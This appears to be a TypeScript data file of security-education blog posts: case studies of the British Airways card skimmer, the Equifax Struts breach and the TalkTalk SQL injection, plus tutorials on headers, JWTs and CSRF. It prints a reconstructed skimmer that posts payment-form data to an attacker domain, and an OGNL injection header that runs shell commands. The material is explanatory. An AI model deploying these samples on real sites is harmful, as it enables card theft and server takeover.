// ============================================================
// SecureDevHub — blog posts & case studies
// ============================================================
import type { BlogPost } from "./types";

export const BLOG_POSTS: BlogPost[] = [
  {
    id: "british-airways-xss",
    title: "How British Airways Lost 380,000 Credit Cards to an XSS Attack",
    excerpt:
      "22 lines of JavaScript hidden in a modified third-party library skimmed every card entered on BA's payment page for 15 days. A technical autopsy of the Magecart attack — and the headers that could have blunted it.",
    category: "Case Study",
    date: "Jan 12, 2026",
    time: "11 min read",
    tags: ["XSS", "Magecart", "Supply Chain", "CSP"],
    featured: true,
    blocks: [
      { t: "p", text: "Between August 21 and September 5, 2018, every customer who entered payment details on britishairways.com or its mobile app had their card number, expiry, CVV, name and address silently copied to a server controlled by criminals. Roughly 380,000 card transactions were skimmed. The attackers didn't breach BA's servers at all — they executed their entire attack inside customers' browsers." },
      { t: "h2", text: "What actually happened" },
      { t: "p", text: "The group behind the attack, known as Magecart (a collective specializing in digital card skimming), gained write access to BA's web servers — the exact method was never publicly confirmed. But instead of touching the database, they did something subtler: they modified a single third-party JavaScript file served on BA's payment pages: Modernizr, a popular feature-detection library." },
      { t: "p", text: "Appended to the bottom of this trusted library were 22 lines of JavaScript. The code waited for the page to load, hooked the submit action of the payment form, and — at the moment a customer pressed the 'Pay' button — serialized every field in the form and sent it to baways.com, a look-alike domain the attackers had registered with a legitimate, paid-for TLS certificate so the exfiltration request looked clean in any network log." },
      { t: "code", banner: "warn", tabs: [{ lang: "javascript", label: "Reconstructed logic (not the original code)", mark: [4, 5], code: `// The skimmer concept: attach to the form's submit button
window.onload = function () {
  var btn = document.getElementById('submitButton');
  btn.addEventListener('mouseup', function () {
    var data = jQuery('#paymentForm').serialize();   // name, card, CVV...
    jQuery.ajax({ url: 'https://baways.com/gateway/app/form/save_data',
                  data: data, type: 'POST' });        // sent to attacker HTTPS
  });
};` }] },
      { t: "p", text: "Notice how surgical this is. No database dump, no suspicious network spikes from BA's servers, no defacement. The file hash simply changed, and because the library loaded as a first-party script from britishairways.com, the browser honored it with full privileges. The mobile app loaded the same webview content, so app users were hit too." },
      { t: "h2", text: "Why it worked" },
      { t: "list", items: [
        "Trusted-third-party execution: any JavaScript served from first-party origin runs with full access to page content — forms included.",
        "No integrity verification: nothing verified that the Modernizr file was still the original. One modified file = total compromise of the page.",
        "No outbound restrictions: the page had no Content-Security-Policy restricting where scripts could send data, so baways.com received POSTs freely.",
        "Look-alike infrastructure: a registered domain with a valid certificate defeated reputation- and TLS-based heuristics.",
      ] },
      { t: "h2", text: "The consequences" },
      { t: "p", text: "The UK's Information Commissioner's Office originally proposed a £183 million fine — about 1.5% of BA's global turnover — later reduced to £20 million considering COVID-19's impact on aviation. It remained one of the largest GDPR penalties ever issued. Beyond the fine: class-action lawsuits, a reputational scar on one of the world's most recognized airlines, and a permanent case study in what 'client-side attack' means." },
      { t: "callout", kind: "warn", text: "This is the attack our CSP guidance is designed to blunt: even with the skimming script executing, a strict connect-src allowlist would have blocked the outbound POST to baways.com." },
      { t: "h2", text: "The lessons" },
      { t: "list", items: [
        "Inventory every script on every payment page. Each one is a claim on your users' most sensitive data.",
        "Use Subresource Integrity (SRI) for anything hosted on a CDN, and monitor file hashes for anything self-hosted — change detection would have caught this on day one.",
        "Deploy CSP with connect-src and form-action allowlists: make exfiltration to unknown origins impossible even when scripts execute.",
        "Restrict powerful DOM access: consider rendering payment inputs inside sandboxed, PCI-scoped iframes (what Stripe/Adyen elements do).",
        "Alert on JavaScript changes in release pipelines — your deploy process should know exactly why a file's hash changed.",
      ] },
      { t: "quote", text: "Security is a process, not a product.", cite: "Bruce Schneier" },
      { t: "p", text: "The BA breach had no single catastrophic bug to patch — it was a process gap: no integrity monitoring, no outbound CSP, too much implicit trust in third-party code. Every one of those is a checklist item, not a mystery. That's exactly why we built the pre-launch checklist." },
    ],
  },
  {
    id: "equifax-breach",
    title: "The Equifax Breach: What Happens When You Skip Dependency Updates",
    excerpt:
      "The patch for CVE-2017-5638 was available for two months before attackers used it to steal 147 million identities. Timeline, root causes, and the dependency-hygiene rules that would have prevented the worst breach in US history.",
    category: "Case Study",
    date: "Jan 5, 2026",
    time: "10 min read",
    tags: ["Dependencies", "Patching", "CVE-2017-5638", "Struts"],
    blocks: [
      { t: "p", text: "In 2017, attackers spent 76 days inside Equifax — one of the three companies whose entire business is judging whether you're trustworthy — and walked out with names, Social Security numbers, birth dates, addresses and driver's license numbers of 147 million people. There was no elite zero-day, no Hollywood hacking. A patch had existed for two months. It was simply never applied." },
      { t: "h2", text: "The vulnerability: CVE-2017-5638" },
      { t: "p", text: "Apache Struts 2, a once-ubiquitous Java web framework, had a flaw in its Jakarta Multipart parser — the code that handles file-upload requests. A crafted Content-Type header caused Struts to evaluate part of the header as an OGNL expression: attacker-controlled input executed as code on the server. In plain terms: send an HTTP request with a magic header, run any command you want." },
      { t: "code", banner: "warn", tabs: [{ lang: "http", label: "The attacker's request shape", mark: [3], code: `POST /upload.action HTTP/1.1
Host: target.example.com
Content-Type: %{(#cmd='id')(#cmds={'/bin/sh','-c',#cmd}).forName(...).exec(#cmds)}
...
# The malformed Content-Type is parsed as an OGNL expression —
# and the server executes the embedded shell commands.` }] },
      { t: "h2", text: "A timeline of preventable failure" },
      { t: "list", items: [
        "March 6, 2017 — CVE-2017-5638 disclosed. Exploit code appeared within days; a patch (Struts 2.3.32 / 2.5.10.1) was released simultaneously.",
        "March 8 — US-CERT notified Equifax directly of the critical vulnerability affecting their stack.",
        "March 9–15 — Equifax's internal directive told admins to patch within 48 hours. Some never received it; the vulnerable dispute portal was missed by the inventory scan.",
        "May 13 — Attackers began exploiting the unpatched portal. They exfiltrated data in small encrypted chunks for 76 days.",
        "July 29 — Suspicious traffic was finally noticed — after a security certificate renewal allowed inspection devices to see it again. The portal was taken offline; the CEO later resigned.",
      ] },
      { t: "p", text: "Let that middle item sink in: the vulnerable server wasn't patched because Equifax didn't know it was vulnerable. Their asset inventory missed it. The scanning tool that should have flagged the Struts version never covered that system. Meanwhile, an expired certificate quietly disabled their encrypted-traffic monitoring for 19 months, so 76 days of exfiltration went unseen." },
      { t: "callout", kind: "info", text: "Every layer of defense failed independently: inventory, patching cadence, monitoring, segmentation. Breaches of this scale are never one bug — they're a process collapse around one bug." },
      { t: "h2", text: "The fallout" },
      { t: "list", items: [
        "147 million people affected — SSNs, birth dates, addresses; 209,000 credit card numbers exposed.",
        "At least $1.4 billion spent on response and remediation; a settlement with the FTC/CFPB/states of up to $700 million.",
        "The CEO, CIO and CSO all departed; one executive was convicted of insider trading for selling shares before disclosure.",
        "A permanent dent in the idea that credit bureaus can be trusted custodians of data they never asked permission to hold.",
      ] },
      { t: "h2", text: "What your team should take from this" },
      { t: "list", items: [
        "Inventory is a security control. You cannot patch what you don't know you're running. Maintain an SBOM (software bill of materials) and keep it honest automatically.",
        "Patching needs SLAs. Critical-internet-facing CVEs: 48 hours. High: 7 days. Make it measurable, assign an owner, review exceptions.",
        "Automate the boring middle: Dependabot/Renovate + a CI gate (npm audit / OSV-Scanner) means updates arrive as small PRs weekly instead of terrifying migrations yearly.",
        "Watch the watchers: monitor your monitoring. Alert when cert renewals, log pipelines or inspection devices go silent — silence is a finding, not peace.",
        "Segment and minimize: the portal shouldn't have had a path to core identity databases; egress controls wouldn't have let 146M records trickle out encrypted for weeks.",
      ] },
      { t: "quote", text: "Amateurs hack systems; professionals hack people — and outdated dependencies let both walk straight in.", cite: "Paraphrased security proverb" },
      { t: "p", text: "Our Dependency & Supply Chain module turns each of these lessons into concrete tooling: lockfiles, SBOM generation, audit gates and update bots. The Equifax breach wasn't bad luck — and your defense doesn't need to be luck either." },
    ],
  },
  {
    id: "security-headers-guide",
    title: "10 Security Headers Every Website Should Have (With Examples)",
    excerpt:
      "Each header takes one line to deploy and disables an attack class. The complete practical set — what it does, why it matters, and ready-to-paste configs for Express, nginx and Apache.",
    category: "Tutorial",
    date: "Dec 29, 2025",
    time: "12 min read",
    tags: ["Headers", "CSP", "HSTS", "Configuration"],
    blocks: [
      { t: "p", text: "If you could only do one security improvement this week, make it headers. They're pure configuration — no code rewrites — every browser enforces them for free, and several would have materially limited famous breaches. Here's the complete set, in order of importance." },
      { t: "h2", text: "1. Content-Security-Policy — the big one" },
      { t: "p", text: "CSP declares where your page's resources may load from and execute. Injected scripts from other hosts, inline <script> tags planted by XSS, and exfiltration to unknown domains all die here. Deploy in Report-Only mode first so you don't break anything." },
      { t: "code", tabs: [{ lang: "http", label: "The header", mark: [1], code: `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'` }] },
      { t: "p", text: "Key directives: script-src 'self' blocks inline and third-party scripts; connect-src controls fetch/XHR destinations (this is what would have hurt the British Airways skimmer); frame-ancestors replaces X-Frame-Options; upgrade-insecure-requests upgrades stray http:// asset URLs." },
      { t: "h2", text: "2. Strict-Transport-Security" },
      { t: "p", text: "Tells browsers: never speak plain HTTP to this domain again. This defeats sslstrip-style downgrade attacks — the first request happens over HTTPS before an attacker can interfere." },
      { t: "code", tabs: [{ lang: "http", label: "The header", mark: [1], code: `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` }] },
      { t: "h2", text: "3. X-Content-Type-Options: nosniff" },
      { t: "p", text: "Stops browsers from MIME-sniffing — without it, an uploaded .txt full of HTML can be executed as a page in your origin. One line, always on:" },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `X-Content-Type-Options: nosniff` }] },
      { t: "h2", text: "4. X-Frame-Options / frame-ancestors" },
      { t: "p", text: "Clickjacking defense: controls who can embed your pages in iframes. Use DENY or SAMEORIGIN; in modern browsers CSP's frame-ancestors takes precedence." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `X-Frame-Options: SAMEORIGIN` }] },
      { t: "h2", text: "5. Referrer-Policy" },
      { t: "p", text: "Controls how much of your URL (paths, query strings with tokens!) leaks to other origins via the Referer header when users click links." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `Referrer-Policy: strict-origin-when-cross-origin` }] },
      { t: "h2", text: "6. Permissions-Policy" },
      { t: "p", text: "The kill-switch for powerful browser features. If you're not a video-calling app, turn them off globally — iframes and injected scripts inherit your policy." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()` }] },
      { t: "h2", text: "7. Cross-Origin-Opener-Policy" },
      { t: "p", text: "Isolates your browsing context so other windows (think window.open) can't hold a reference to yours — closes Spectre-style side channels and tab-nabbing." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `Cross-Origin-Opener-Policy: same-origin` }] },
      { t: "h2", text: "8. Cross-Origin-Resource-Policy" },
      { t: "p", text: "Declares which sites may embed your resources as subresources (images, scripts). Blocks your content being sucked into other origins." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `Cross-Origin-Resource-Policy: same-origin` }] },
      { t: "h2", text: "9. Cache-Control (for sensitive pages)" },
      { t: "p", text: "Authenticated pages must never be cached by shared proxies or linger in browser history. Set it defensively on anything behind a login." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `Cache-Control: no-store, max-age=0` }] },
      { t: "h2", text: "10. X-XSS-Protection: 0" },
      { t: "p", text: "Counter-intuitive but deliberate: browsers removed their XSS auditors because they introduced vulnerabilities; leaving the legacy header enabled can re-activate filter bugs in old browsers. Explicitly disable it and rely on CSP." },
      { t: "code", tabs: [{ lang: "http", label: "The header", code: `X-XSS-Protection: 0` }] },
      { t: "callout", kind: "ok", text: "Set all ten in five minutes: helmet() in Express sets eight of them by default; add your tuned CSP and Permissions-Policy and you're done." },
      { t: "h2", text: "Ready-to-paste configs" },
      { t: "code", banner: "ok", tabs: [
        { lang: "javascript", label: "Express", mark: [2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14], code: `import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
    },
  },
  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));` },
        { lang: "bash", label: "nginx", mark: [2, 3, 4, 5, 6, 7], code: `add_header Content-Security-Policy "default-src 'self'; script-src 'self'; frame-ancestors 'none'" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;` },
        { lang: "bash", label: "Apache (.htaccess)", mark: [1, 2, 3, 4, 5, 6], code: `Header always set Content-Security-Policy "default-src 'self'; frame-ancestors 'none'"
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains"
Header always set X-Content-Type-Options "nosniff"
Header always set X-Frame-Options "SAMEORIGIN"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"` },
      ] },
      { t: "h2", text: "Verify your work" },
      { t: "p", text: "Scan your site with securityheaders.com and Mozilla Observatory; aim for A+. Then run your own domain through our Pre-Launch checklist — headers are just one of its nine groups." },
    ],
  },
  {
    id: "jwt-pitfalls",
    title: "6 JWT Pitfalls That Keep Showing Up in Real Audits",
    excerpt:
      "alg:none confusions, localStorage sessions, and the 'decode is not verify' bug — recurring JWT mistakes and their exact fixes.",
    category: "Tutorial",
    date: "Dec 18, 2025",
    time: "7 min read",
    tags: ["JWT", "Authentication", "API"],
    blocks: [
      { t: "p", text: "JSON Web Tokens power half the APIs on the internet — and the same six mistakes appear in audit after audit. This is the field guide to each one. (Full details live in our Authentication module.)" },
      { t: "h2", text: "1. Accepting the token's chosen algorithm" },
      { t: "p", text: "Old libraries trusted the token's alg header — attackers sent alg: 'none' with an empty signature, or downgraded RS256 to HS256 using the public key as the HMAC secret. Fix: pin algorithms server-side everywhere." },
      { t: "code", tabs: [{ lang: "javascript", label: "The fix", mark: [1], code: `jwt.verify(token, PUBLIC_KEY, { algorithms: ['RS256'] });` }] },
      { t: "h2", text: "2. decode() instead of verify()" },
      { t: "p", text: "jwt.decode parses claims WITHOUT checking the signature. It's for debugging only — using it for authorization means forged claims pass. See our playground's 'Trusting Tokens' challenge for the exact shape." },
      { t: "h2", text: "3. Sensitive data in the payload" },
      { t: "p", text: "JWTs are Base64URL — readable by anyone holding the token: your users, logs, error trackers, analytics. Payload = user id + roles at most. Nothing you'd hesitate to print." },
      { t: "h2", text: "4. localStorage storage" },
      { t: "p", text: "Any XSS (even via a compromised dependency) reads localStorage silently. HttpOnly, Secure, SameSite cookies remove tokens from JavaScript's reach entirely; if you must use localStorage, access tokens should live minutes, not days." },
      { t: "h2", text: "5. No expiry, no revocation story" },
      { t: "p", text: "Stateless tokens can't be invalidated — a stolen week-long token is a week of access. Use short-lived access tokens (5–15 min) with rotating refresh tokens and a revocation list for the refresh path." },
      { t: "h2", text: "6. Using JWTs for browser sessions at all" },
      { t: "p", text: "Server-side sessions (Redis store, opaque cookie) give you instant revocation, no client crypto surface and smaller cookies. Reach for JWTs when you actually need stateless service-to-service federation — not because tutorials default to it." },
      { t: "callout", kind: "ok", text: "Action item: grep your codebase for jwt.decode today. If any result isn't a comment or a test, you found a vulnerability." },
    ],
  },
  {
    id: "talktalk-sqli-lessons",
    title: "A Teenager, Three Vulnerable Pages, 157,000 Customers: The TalkTalk SQLi",
    excerpt:
      "The 2015 TalkTalk breach needed no sophistication — a public SQL injection, found with off-the-shelf tools, emptied the customer database. Five lessons that still apply.",
    category: "Case Study",
    date: "Dec 8, 2025",
    time: "6 min read",
    tags: ["SQL Injection", "Case Study", "OWASP"],
    blocks: [
      { t: "p", text: "In October 2015, UK telecom TalkTalk lost the personal and partial financial data of 157,000 customers. The attacker? A 17-year-old using legally downloadable software (sqlmap) against three pages the company had inherited from a 2009 acquisition and never audited. The ICO fined TalkTalk a then-record £400,000; the CEO admitted the attack was, in her words, 'a basic vulnerability' that 'could have been prevented'." },
      { t: "h2", text: "How basic was it?" },
      { t: "p", text: "The three pages concatenated user input directly into SQL queries — the exact pattern from our playground's first challenge. sqlmap, pointed at the URL, enumerated databases, dumped tables, and exported customer records, all with default settings. No authentication bypass required; the pages were public." },
      { t: "list", items: [
        "Legacy systems are YOUR systems: the vulnerable pages came with an acquisition — inherited risk is still risk.",
        "Scanning beats hoping: any internal sqlmap/ZAP run would have found it in minutes. Attackers run these continuously; defenders should too.",
        "Parameterized queries are a wipeout fix: had even one of the three pages used prepared statements, the year-2015 story ends differently — 'not exotic', as the ICO put it.",
        "Data minimization is breach minimization: customers from 2009 still had full records on an internet-facing database.",
        "Incident response is part of security: TalkTalk's worst-case public statements initially claimed far more data was stolen than was — a reminder that uncertainty is expensive.",
      ] },
      { t: "callout", kind: "warn", text: "If you haven't pointed sqlmap at your own staging environment, someone else will point it at production. That's not a threat — it's just Tuesday on the internet." },
      { t: "p", text: "Start with our SQL Injection module: understand the three injection classes, then run through the pre-launch checklist's Input & Data section against your own codebase this week." },
    ],
  },
  {
    id: "csrf-modern-era",
    title: "CSRF in 2026: SameSite Killed It... Except Where It Didn't",
    excerpt:
      "SameSite=Lax-by-default made classic CSRF rare — but GET-based mutations, SameSite=None APIs and improper CORS still leave real holes. What to check in your app.",
    category: "Tutorial",
    date: "Nov 30, 2025",
    time: "5 min read",
    tags: ["CSRF", "Cookies", "SameSite"],
    blocks: [
      { t: "p", text: "When Chrome flipped SameSite=Lax-by-default in 2020, the classic 'hidden auto-submitting form' CSRF largely stopped working — cross-site POSTs simply arrive without cookies now. Has CSRF been solved? Mostly — but the exceptions map neatly onto patterns we still see in audits." },
      { t: "h2", text: "Where CSRF still lives" },
      { t: "list", items: [
        "GET requests that change state: /api/user/delete?confirm=true works from a bare <img> tag on any site. SameSite=Lax attaches cookies to top-level GETs — by design.",
        "Cookies explicitly set SameSite=None (needed by cross-site SPAs): you're back to 2015 unless a token is verified on every mutation.",
        "Subdomain trust: attacker-controlled content on any *.example.com can still ride requests to app.example.com depending on cookie domain scoping — use __Host- prefixed cookies and tight Domain attributes.",
        "Login CSRF: forcing victims to log in as the attacker, then harvesting what they enter — defeat by binding pre-login and post-login sessions and re-prompting for MFA at sensitive steps.",
      ] },
      { t: "h2", text: "The modern defense stack" },
      { t: "list", items: [
        "SameSite=Lax (or Strict) + Secure + HttpOnly + __Host- prefix on session cookies.",
        "Server-verified CSRF tokens on every mutation — even with Lax, defense must not depend on a browser default.",
        "No state changes on GET. Zero exceptions, including logout.",
        "Origin/Referer header checks as a cheap second signal for the most dangerous actions.",
        "Re-authentication prompts (password or MFA) for email changes, payouts and credential changes.",
      ] },
      { t: "quote", text: "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards — and even then I have my doubts.", cite: "Eugene H. Spafford" },
      { t: "p", text: "Our CSRF module walks through the full attack with a live vulnerable form example, then rebuilds it with tokens, SameSite and double-submit patterns for SPAs." },
    ],
  },
];

export function getPost(id: string): BlogPost | undefined {
  return BLOG_POSTS.find((p) => p.id === id);
}
